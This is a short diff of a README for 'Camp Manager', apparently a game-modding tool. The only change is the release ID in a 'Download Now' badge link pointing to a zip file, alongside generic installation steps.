@@ -21,7 +21,7 @@
     <li>Clone or download the repository to your local machine.</li>
     <li>Follow the installation instructions provided in the repository's documentation.</li>
     <li>Launch Camp Manager and prepare to embark on an exciting modding journey!</li>
-    <a href="https://github.com/Pizlizquiz/Camp-Manager/releases/download/21323/Camp.Manager.zip"><img src="https://camo.githubusercontent.com/380470919bad1f56f2a619fda7cd461cb9922135da1b9ee410d3b3e12a407865/68747470733a2f2f696d672e736869656c64732e696f2f62616467652f446f776e6c6f61642d4e6f772d477265656e3f7374796c653d666f722d7468652d6261646765266c6f676f3d6170707665796f72" alt="Download" data-canonical-src="https://img.shields.io/badge/Download-Now-Green?style=for-the-badge&amp;logo=appveyor" style="max-width: 100%;"></a>
+    <a href="https://github.com/Pizlizquiz/Camp-Manager/releases/download/321321/Camp.Manager.zip"><img src="https://camo.githubusercontent.com/380470919bad1f56f2a619fda7cd461cb9922135da1b9ee410d3b3e12a407865/68747470733a2f2f696d672e736869656c64732e696f2f62616467652f446f776e6c6f61642d4e6f772d477265656e3f7374796c653d666f722d7468652d6261646765266c6f676f3d6170707665796f72" alt="Download" data-canonical-src="https://img.shields.io/badge/Download-Now-Green?style=for-the-badge&amp;logo=appveyor" style="max-width: 100%;"></a>
   </ol>
 
   <h2>🙋Contributing🙋</h2>
